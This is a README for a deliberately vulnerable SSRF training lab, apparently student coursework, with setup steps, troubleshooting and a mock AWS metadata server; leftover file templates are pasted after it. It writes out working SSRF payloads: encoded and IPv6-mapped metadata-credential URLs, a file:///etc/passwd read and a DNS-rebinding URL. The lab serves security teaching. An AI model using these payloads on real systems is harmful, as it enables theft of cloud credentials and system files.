# SSRF Multi-Level Laboratory

A comprehensive Server-Side Request Forgery (SSRF) penetration testing laboratory with four progressive security levels and AWS IMDS simulation.

## 🎯 Overview

This laboratory environment demonstrates various SSRF attack techniques and protection mechanisms in a safe, controlled setting. It includes:

- **4 Security Protection Levels**: From completely vulnerable (NONE) to enterprise-grade defense (IMPOSSIBLE)
- **AWS IMDS Simulation**: Mock AWS Instance Metadata Service v1 for realistic cloud attack scenarios
- **Comprehensive Attack Vectors**: IP encoding, IPv6, DNS rebinding, protocol bypasses, and more
- **Educational Interface**: Visual feedback, detailed logging, and bypass reference guide

**⚠️ WARNING**: This is a deliberately vulnerable application designed for educational purposes only. **NEVER** deploy this on production systems or public-facing servers.

---

## ✨ Features

### Security Levels

- **NONE**: No protection (baseline vulnerability)
- **MEDIUM**: Blacklist-based filtering (IP + keyword blocking)
- **HIGH**: Enterprise-grade protection (IP normalization, RFC 1918 blocking, DNS validation)
- **IMPOSSIBLE**: Multi-layer defense (TOCTOU protection, rate limiting, content scanning)

### Attack Demonstrations

- ✅ Direct IP access (169.254.169.254)
- ✅ IP encoding bypasses (decimal, hexadecimal, octal)
- ✅ IPv4-mapped IPv6 exploitation
- ✅ File protocol access (file://)
- ✅ DNS rebinding attacks
- ✅ Port-based bypasses
- ✅ Protocol variations

### Components

- **ssrf_multilevel.php**: Main vulnerable application with 4 protection levels
- **aws_imds_mock.py**: Python-based AWS IMDS v1 simulator
- **bypass_cheatsheet.html**: Interactive reference guide for SSRF techniques

---

## 📋 Prerequisites

### System Requirements

- **Operating System**: Ubuntu Server 20.04+ / Debian 11+
- **Web Server**: Apache 2.4+
- **PHP**: 8.0+ with standard extensions
- **Python**: 3.8+
- **Network**: Isolated/lab environment (VMware, VirtualBox, or similar)

### Required Packages
```bash
sudo apt update
sudo apt install -y apache2 php libapache2-mod-php python3
```

---

## 📁 Repository Structure
```
ssrf-multilevel-lab/
├── README.md
├── ssrf_multilevel.php       # Main vulnerable application
├── aws_imds_mock.py          # AWS IMDS mock server
└── bypass_cheatsheet.html    # SSRF bypass reference guide
```

---

## 🚀 Installation

### Step 1: Clone Repository
```bash
git clone https://github.com/YOUR-USERNAME/ssrf-multilevel-lab.git
cd ssrf-multilevel-lab
```

### Step 2: Deploy Web Application Files
```bash
# Copy files to Apache web root
sudo cp ssrf_multilevel.php /var/www/html/
sudo cp bypass_cheatsheet.html /var/www/html/

# Set proper permissions
sudo chown www-data:www-data /var/www/html/ssrf_multilevel.php
sudo chown www-data:www-data /var/www/html/bypass_cheatsheet.html
sudo chmod 644 /var/www/html/ssrf_multilevel.php
sudo chmod 644 /var/www/html/bypass_cheatsheet.html
```

### Step 3: Deploy IMDS Mock Server
```bash
# Create directory for IMDS mock
sudo mkdir -p /opt/imds

# Copy Python script
sudo cp aws_imds_mock.py /opt/imds/

# Set permissions
sudo chmod 755 /opt/imds/aws_imds_mock.py
```

### Step 4: Configure Apache (Optional - Port 8080)

If you want to run on port 8080 instead of default port 80:
```bash
# Edit ports configuration
sudo nano /etc/apache2/ports.conf
```

Add or modify:
```apache
Listen 8080
```
```bash
# Edit default site configuration
sudo nano /etc/apache2/sites-available/000-default.conf
```

Change first line to:
```apache
<VirtualHost *:8080>
```
```bash
# Restart Apache
sudo systemctl restart apache2
```

### Step 5: Create Log File
```bash
# Create log file with proper permissions
sudo touch /tmp/ssrf_attempts.log
sudo chmod 666 /tmp/ssrf_attempts.log
```

### Step 6: Verify Apache Status
```bash
# Check Apache is running
sudo systemctl status apache2

# Verify listening port
sudo ss -tlnp | grep apache2
# Should show: *:8080 or *:80
```

---

## ⚙️ Configuration

### Configure AWS IMDS IP Address

The AWS IMDS mock server requires the IP `169.254.169.254` to be assigned to the loopback interface:
```bash
# Add IP to loopback (temporary - lost on reboot)
sudo ip addr add 169.254.169.254/32 dev lo

# Verify IP was added
ip addr show lo | grep 169.254
# Should output: inet 169.254.169.254/32 scope global lo
```

#### Make IP Persistent (Optional)

To survive reboots, create a systemd service:
```bash
# Create service file
sudo nano /etc/systemd/system/imds-ip.service
```

Add content:
```ini
[Unit]
Description=Add IMDS IP to loopback
After=network.target

[Service]
Type=oneshot
ExecStart=/sbin/ip addr add 169.254.169.254/32 dev lo
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
```
```bash
# Enable and start service
sudo systemctl enable imds-ip.service
sudo systemctl start imds-ip.service
```

---

## 🎮 Usage

### Starting the Laboratory

#### 1. Start IMDS Mock Server
```bash
# Navigate to IMDS directory
cd /opt/imds

# Run mock server (requires sudo for port 80)
sudo python3 aws_imds_mock.py
```

**Expected Output:**
```
Starting AWS IMDS Mock Server...
Listening on 169.254.169.254:80
Server ready. Press Ctrl+C to stop.
```

**Run in background (optional):**
```bash
sudo nohup python3 /opt/imds/aws_imds_mock.py > /tmp/imds.log 2>&1 &
```

#### 2. Verify IMDS is Responding

Open another terminal:
```bash
# Test IMDS endpoints
curl http://169.254.169.254/latest/meta-data/

# Test credentials endpoint
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole
```

**Expected Response (credentials endpoint):**
```json
{
  "Code": "Success",
  "LastUpdated": "2024-02-26T10:30:45Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIATESTAWSACCESSKEY123",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "FwoGZXIvYXdzEBQa...",
  "Expiration": "2024-02-26T14:30:45Z"
}
```

#### 3. Access Web Application

Open your browser and navigate to:
```
http://SERVER_IP:8080/ssrf_multilevel.php
```

Replace `SERVER_IP` with your server's IP address (e.g., `192.168.186.140`)

---

### Testing Examples

#### Example 1: NONE Level - Direct Access

1. Select security level: **NONE**
2. Enter URL:
```
   http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole
```
3. Click **Test URL**
4. ✅ **Result**: AWS credentials displayed

---

#### Example 2: MEDIUM Level - Decimal IP Bypass

1. Select security level: **MEDIUM**
2. Enter URL (decimal IP format):
```
   http://2852039166/latest/meta-data/iam/security-credentials/WebServerRole
```
   
   **IP Conversion:**
   - `169.254.169.254` → `2852039166` (decimal)
   - Formula: `169×256³ + 254×256² + 169×256 + 254`

3. Click **Test URL**
4. ✅ **Result**: Bypassed blacklist, credentials displayed

---

#### Example 3: HIGH Level - IPv4-Mapped IPv6 Bypass

1. Select security level: **HIGH**
2. Enter URL (IPv6 format):
```
   http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/WebServerRole
```
3. Click **Test URL**
4. ✅ **Result**: Bypassed normalization, credentials displayed (bug exploitation)

---

#### Example 4: MEDIUM Level - File Protocol

1. Select security level: **MEDIUM**
2. Enter URL:
```
   file:///etc/passwd
```
3. Click **Test URL**
4. ✅ **Result**: System file contents displayed

---

#### Example 5: IMPOSSIBLE Level - Blocked Request

1. Select security level: **IMPOSSIBLE**
2. Enter URL:
```
   http://2852039166/latest/meta-data/
```
3. Click **Test URL**
4. ❌ **Result**: Blocked with message:
```
   Blocked: Private/Internal IP detected (169.254.169.254)
```

---

### View Request Logs

Monitor all SSRF attempts:
```bash
# Real-time log viewing
tail -f /tmp/ssrf_attempts.log

# View last 20 attempts
tail -20 /tmp/ssrf_attempts.log

# Clear logs
sudo truncate -s 0 /tmp/ssrf_attempts.log
```

**Log Format:**
```
[2026-03-21 10:30:45] Level: MEDIUM | URL: http://2852039166/latest/meta-data/ | Blocked: NO | Reason: N/A
[2026-03-21 10:31:12] Level: HIGH | URL: http://2852039166/latest/meta-data/ | Blocked: YES | Reason: Private/Internal IP detected (169.254.169.254)
```

---

### Access Bypass Reference Guide

Open in browser:
```
http://SERVER_IP:8080/bypass_cheatsheet.html
```

This guide includes:
- IP conversion calculators
- Encoding techniques
- Protocol bypass methods
- Effectiveness tables by security level

---

## 🔧 Troubleshooting

### Issue: "Connection refused" to IMDS

**Symptoms:**
```
Request failed: Connection refused (169.254.169.254:80)
```

**Solutions:**

1. **Check IMDS script is running:**
```bash
   sudo ps aux | grep aws_imds_mock
```

2. **Verify IP is configured:**
```bash
   ip addr show lo | grep 169.254
```
   If missing:
```bash
   sudo ip addr add 169.254.169.254/32 dev lo
```

3. **Check port 80 is listening:**
```bash
   sudo ss -tlnp | grep :80
```

4. **Test direct connection:**
```bash
   curl http://169.254.169.254/latest/meta-data/
```

---

### Issue: "Permission denied" running IMDS script

**Symptoms:**
```
PermissionError: [Errno 13] Permission denied
```

**Solution:**
Run with sudo (required for port 80):
```bash
sudo python3 /opt/imds/aws_imds_mock.py
```

---

### Issue: Apache not serving PHP files

**Symptoms:**
- Browser downloads `ssrf_multilevel.php` instead of executing it
- Shows raw PHP code

**Solutions:**

1. **Install PHP module:**
```bash
   sudo apt install libapache2-mod-php
   sudo systemctl restart apache2
```

2. **Enable PHP module:**
```bash
   sudo a2enmod php8.1  # or your PHP version
   sudo systemctl restart apache2
```

3. **Verify PHP is working:**
```bash
   php -v
```

---

### Issue: "File not found" errors

**Symptoms:**
```
404 Not Found
```

**Solutions:**

1. **Verify files are in correct location:**
```bash
   ls -la /var/www/html/ssrf_multilevel.php
   ls -la /var/www/html/bypass_cheatsheet.html
```

2. **Check Apache DocumentRoot:**
```bash
   grep DocumentRoot /etc/apache2/sites-enabled/000-default.conf
```
   Should show: `DocumentRoot /var/www/html`

3. **Check file permissions:**
```bash
   sudo chown www-data:www-data /var/www/html/*.php
   sudo chmod 644 /var/www/html/*.php
```

---

### Issue: Rate limiting too restrictive

**Symptoms:**
```
Blocked: Rate limit exceeded. Maximum 10 requests per minute.
```

**Solution:**
Wait 60 seconds or modify rate limit in `ssrf_multilevel.php`:

Find line:
```php
if ($request_count >= 10) {
```

Change to higher limit (e.g., 50):
```php
if ($request_count >= 50) {
```

---

### Issue: Cannot access from external machine

**Symptoms:**
- Lab works on localhost but not from other machines

**Solutions:**

1. **Check firewall:**
```bash
   sudo ufw status
   sudo ufw allow 8080/tcp  # or your Apache port
```

2. **Verify Apache is listening on all interfaces:**
```bash
   sudo ss -tlnp | grep apache2
```
   Should show `0.0.0.0:8080` not `127.0.0.1:8080`

3. **Check virtual host configuration:**
```bash
   grep "Listen" /etc/apache2/ports.conf
```
   Should show `Listen 8080` (not `Listen 127.0.0.1:8080`)

---

## 🛑 Stopping the Laboratory
```bash
# Stop IMDS mock server
sudo pkill -f aws_imds_mock.py

# Stop Apache (optional)
sudo systemctl stop apache2

# Remove IMDS IP (optional)
sudo ip addr del 169.254.169.254/32 dev lo
```

---

## 🧪 Advanced Testing

### DNS Rebinding Attack (Requires Additional Setup)

For DNS rebinding demonstrations, you'll need a controlled DNS server. See separate documentation in the repository wiki.

**Quick option:** Use public service `rebind.network`

Example payload:
```
http://08080808.a9fea9fe.rbndr.us/latest/meta-data/
```
- `08080808` = 8.8.8.8 (public IP in hex)
- `a9fea9fe` = 169.254.169.254 (IMDS in hex)

---

## 📚 Educational Resources

### SSRF Attack References

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [AWS IMDS Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [CVE-2019-5418 - Rails SSRF](https://nvd.nist.gov/vuln/detail/CVE-2019-5418)

### IP Conversion Tools

**Decimal Conversion:**
```python
# IP to Decimal
ip = "169.254.169.254"
octets = ip.split('.')
decimal = int(octets[0])*256**3 + int(octets[1])*256**2 + int(octets[2])*256 + int(octets[3])
print(decimal)  # 2852039166
```

**Hexadecimal Conversion:**
```python
# IP to Hex
ip = "169.254.169.254"
hex_ip = "0x" + "".join([format(int(x), '02x') for x in ip.split('.')])
print(hex_ip)  # 0xa9fea9fe
```

**Octal Conversion:**
```python
# IP to Octal
ip = "169.254.169.254"
octal_ip = ".".join([format(int(x), '04o') for x in ip.split('.')])
print(octal_ip)  # 0251.0376.0251.0376
```

---

## ⚠️ Legal Disclaimer

This tool is provided for **EDUCATIONAL PURPOSES ONLY**.

- ✅ Use in controlled lab environments
- ✅ Use for authorized penetration testing
- ✅ Use for security research and training

- ❌ Do NOT use on systems you don't own
- ❌ Do NOT deploy on production servers
- ❌ Do NOT use for unauthorized testing

**You are responsible for complying with all applicable laws and regulations, including the Computer Misuse Act and equivalent legislation in your jurisdiction.**

---

## 🤝 Contributing

Contributions are welcome! Please feel free to submit pull requests or open issues for:

- Bug fixes
- New bypass techniques
- Improved documentation
- Additional security levels
- Performance improvements

---

## 📄 License

This project is licensed under the MIT License - see LICENSE file for details.

---

## 👨‍💻 Author

Created for CC6051 Ethical Hacking Coursework 2025-26

---

## 🙏 Acknowledgments

- AWS for IMDS documentation
- OWASP for SSRF prevention guidelines
- The security research community for bypass techniques

---

## 📧 Support

For issues or questions:
1. Check the [Troubleshooting](#-troubleshooting) section
2. Review [closed issues](https://github.com/YOUR-USERNAME/ssrf-multilevel-lab/issues?q=is%3Aissue+is%3Aclosed)
3. Open a new issue with:
   - Your OS version
   - PHP version (`php -v`)
   - Python version (`python3 --version`)
   - Apache version (`apache2 -v`)
   - Complete error message
   - Steps to reproduce

---

**Happy ethical hacking! 🔒🔓**
```

---

## 📝 **ADDITIONAL FILES TO CREATE**

### **LICENSE** (MIT License - Optional)
```
MIT License

Copyright (c) 2026 [YOUR NAME]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

### **.gitignore**
```
# Logs
*.log
/tmp/

# OS files
.DS_Store
Thumbs.db

# IDE
.vscode/
.idea/
*.swp
*.swo

# Python
__pycache__/
*.pyc
*.pyo
